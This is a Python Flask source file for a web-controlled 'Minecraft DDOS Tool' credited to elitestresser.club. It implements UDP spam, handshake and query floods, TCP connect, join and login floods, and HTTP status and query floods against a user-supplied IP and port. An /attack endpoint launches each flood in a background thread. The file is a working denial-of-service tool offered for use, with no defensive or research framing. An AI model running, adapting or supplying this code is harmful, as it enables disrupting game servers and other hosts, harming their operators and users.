from flask import Flask, render_template, request, jsonify
import socket
import random
import time
import requests
from threading import Thread
from colorama import init, Fore

app = Flask(__name__)
init(autoreset=True)

# ASCII Art
ASCII_ART = """
  __  __       _                          _     _____  _____   _____ 
 |  \/  |     (_)                        | |   |  __ \|  __ \ /     |
 | \  / | __ _ _ _ __  _ __   __ _ _ __ | |_  | |  | | |  | |  |  | 
 | |\/| |/ _` | | '_ \| '_ \ / _` | '_ \| __| | |  | | |  | |  |  | 
 | |  | | (_| | | | | | | | | (_| | | | | |_  | |__| | |__| |  |  | 
 |_|  |_|__,_|_|_| |_|_| |_|__,_|_| |_|__| |_____/|_____/ ______|
       Minecraft DDOS Tool V2 - Made by elitestresser.club
"""

# Layer 4 UDP Methods (Minecraft-specific)
def udp_spam(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = random.randbytes(packet_size)
    message = f"[🚀] UDP Spam on {ip}:{port} | {packet_size} bytes | {duration}s..."
    print(Fore.CYAN + message)
    try:
        while time.time() < end_time:
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        error_msg = f"[❌] Error: {e}"
        print(Fore.RED + error_msg)
        message += "\n" + error_msg
    finally:
        sock.close()
        done_msg = f"[✅] Done! Sent {packet_count} packets."
        print(Fore.GREEN + done_msg)
        message += "\n" + done_msg
    return message

def udp_handshake(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    handshake = bytes([0x00, 0x00]) + random.randbytes(packet_size - 2)
    message = f"[🚀] UDP Handshake Flood on {ip}:{port} | {packet_size} bytes | {duration}s..."
    print(Fore.CYAN + message)
    try:
        while time.time() < end_time:
            sock.sendto(handshake, (ip, port))
            packet_count += 1
    except Exception as e:
        error_msg = f"[❌] Error: {e}"
        print(Fore.RED + error_msg)
        message += "\n" + error_msg
    finally:
        sock.close()
        done_msg = f"[✅] Done! Sent {packet_count} packets."
        print(Fore.GREEN + done_msg)
        message += "\n" + done_msg
    return message

def udp_query(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    query = bytes([0xFE, 0x01]) + random.randbytes(packet_size - 2)
    message = f"[🚀] UDP Query Flood on {ip}:{port} | {packet_size} bytes | {duration}s..."
    print(Fore.CYAN + message)
    try:
        while time.time() < end_time:
            sock.sendto(query, (ip, port))
            packet_count += 1
    except Exception as e:
        error_msg = f"[❌] Error: {e}"
        print(Fore.RED + error_msg)
        message += "\n" + error_msg
    finally:
        sock.close()
        done_msg = f"[✅] Done! Sent {packet_count} query packets."
        print(Fore.GREEN + done_msg)
        message += "\n" + done_msg
    return message

# Layer 4 TCP Methods (Minecraft-specific)
def tcp_connect(ip, port, duration, packet_size):
    end_time = time.time() + duration
    connection_count = 0
    message = f"[🚀] TCP Connect Flood on {ip}:{port} | {duration}s..."
    print(Fore.CYAN + message)
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect_ex((ip, port))
            connection_count += 1
            sock.close()
    except Exception as e:
        error_msg = f"[❌] Error: {e}"
        print(Fore.RED + error_msg)
        message += "\n" + error_msg
    done_msg = f"[✅] Done! Made {connection_count} connections."
    print(Fore.GREEN + done_msg)
    message += "\n" + done_msg
    return message

def tcp_join(ip, port, duration, packet_size):
    end_time = time.time() + duration
    packet_count = 0
    handshake = bytes([0x00, 0x00, 0xFF, 0xFF]) + random.randbytes(packet_size - 4)
    message = f"[🚀] TCP Join Flood on {ip}:{port} | {packet_size} bytes | {duration}s..."
    print(Fore.CYAN + message)
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(handshake)
            packet_count += 1
            sock.close()
    except Exception as e:
        error_msg = f"[❌] Error: {e}"
        print(Fore.RED + error_msg)
        message += "\n" + error_msg
    done_msg = f"[✅] Done! Sent {packet_count} join packets."
    print(Fore.GREEN + done_msg)
    message += "\n" + done_msg
    return message

def tcp_login(ip, port, duration, packet_size):
    end_time = time.time() + duration
    packet_count = 0
    login = bytes([0x02, 0x00, 0x07]) + b"BotUser" + random.randbytes(packet_size - 12)
    message = f"[🚀] TCP Login Flood on {ip}:{port} | {packet_size} bytes | {duration}s..."
    print(Fore.CYAN + message)
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(login)
            packet_count += 1
            sock.close()
    except Exception as e:
        error_msg = f"[❌] Error: {e}"
        print(Fore.RED + error_msg)
        message += "\n" + error_msg
    done_msg = f"[✅] Done! Sent {packet_count} login attempts."
    print(Fore.GREEN + done_msg)
    message += "\n" + done_msg
    return message

# Layer 7 HTTP Methods (Minecraft-specific resource drain)
def http_status_flood(ip, duration):
    end_time = time.time() + duration
    request_count = 0
    url = f"http://{ip}:25565/status"
    message = f"[🚀] HTTP Status Flood on {url} | {duration}s..."
    print(Fore.CYAN + message)
    try:
        while time.time() < end_time:
            requests.get(url, timeout=1)
            request_count += 1
    except Exception as e:
        error_msg = f"[❌] Error: {e}"
        print(Fore.RED + error_msg)
        message += "\n" + error_msg
    done_msg = f"[✅] Done! Sent {request_count} status requests."
    print(Fore.GREEN + done_msg)
    message += "\n" + done_msg
    return message

def http_query_flood(ip, duration):
    end_time = time.time() + duration
    request_count = 0
    url = f"http://{ip}:25565/query"
    message = f"[🚀] HTTP Query Flood on {url} | {duration}s..."
    print(Fore.CYAN + message)
    try:
        while time.time() < end_time:
            requests.get(url, timeout=1)
            request_count += 1
    except Exception as e:
        error_msg = f"[❌] Error: {e}"
        print(Fore.RED + error_msg)
        message += "\n" + error_msg
    done_msg = f"[✅] Done! Sent {request_count} query requests."
    print(Fore.GREEN + done_msg)
    message += "\n" + done_msg
    return message

@app.route('/')
def index():
    return render_template('index.html', ascii_art=ASCII_ART)

@app.route('/attack', methods=['POST'])
def attack():
    data = request.json
    attack_type = data['attack_type']
    ip = data['ip']
    port = int(data.get('port', 25565))
    duration = int(data['duration'])
    
    # Default response
    response = {
        "status": "error",
        "message": "Invalid attack type",
        "output": ""
    }
    
    try:
        if attack_type == "udp_spam":
            packet_size = int(data['packet_size'])
            thread = Thread(target=udp_spam, args=(ip, port, duration, packet_size))
            thread.start()
            response = {
                "status": "started",
                "message": "UDP spam attack initiated",
                "output": f"[🚀] UDP Spam on {ip}:{port} | {packet_size} bytes | {duration}s..."
            }
        
        elif attack_type == "udp_handshake":
            packet_size = int(data['packet_size'])
            thread = Thread(target=udp_handshake, args=(ip, port, duration, packet_size))
            thread.start()
            response = {
                "status": "started",
                "message": "UDP handshake attack initiated",
                "output": f"[🚀] UDP Handshake Flood on {ip}:{port} | {packet_size} bytes | {duration}s..."
            }
        
        elif attack_type == "udp_query":
            packet_size = int(data['packet_size'])
            thread = Thread(target=udp_query, args=(ip, port, duration, packet_size))
            thread.start()
            response = {
                "status": "started",
                "message": "UDP query attack initiated",
                "output": f"[🚀] UDP Query Flood on {ip}:{port} | {packet_size} bytes | {duration}s..."
            }
        
        elif attack_type == "tcp_connect":
            packet_size = int(data.get('packet_size', 1024))
            thread = Thread(target=tcp_connect, args=(ip, port, duration, packet_size))
            thread.start()
            response = {
                "status": "started",
                "message": "TCP connect attack initiated",
                "output": f"[🚀] TCP Connect Flood on {ip}:{port} | {duration}s..."
            }
        
        elif attack_type == "tcp_join":
            packet_size = int(data['packet_size'])
            thread = Thread(target=tcp_join, args=(ip, port, duration, packet_size))
            thread.start()
            response = {
                "status": "started",
                "message": "TCP join attack initiated",
                "output": f"[🚀] TCP Join Flood on {ip}:{port} | {packet_size} bytes | {duration}s..."
            }
        
        elif attack_type == "tcp_login":
            packet_size = int(data['packet_size'])
            thread = Thread(target=tcp_login, args=(ip, port, duration, packet_size))
            thread.start()
            response = {
                "status": "started",
                "message": "TCP login attack initiated",
                "output": f"[🚀] TCP Login Flood on {ip}:{port} | {packet_size} bytes | {duration}s..."
            }
        
        elif attack_type == "http_status":
            thread = Thread(target=http_status_flood, args=(ip, duration))
            thread.start()
            response = {
                "status": "started",
                "message": "HTTP status attack initiated",
                "output": f"[🚀] HTTP Status Flood on http://{ip}:25565/status | {duration}s..."
            }
        
        elif attack_type == "http_query":
            thread = Thread(target=http_query_flood, args=(ip, duration))
            thread.start()
            response = {
                "status": "started",
                "message": "HTTP query attack initiated",
                "output": f"[🚀] HTTP Query Flood on http://{ip}:25565/query | {duration}s..."
            }
    
    except Exception as e:
        response = {
            "status": "error",
            "message": str(e),
            "output": f"[❌] Error: {str(e)}"
        }
    
    return jsonify(response)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)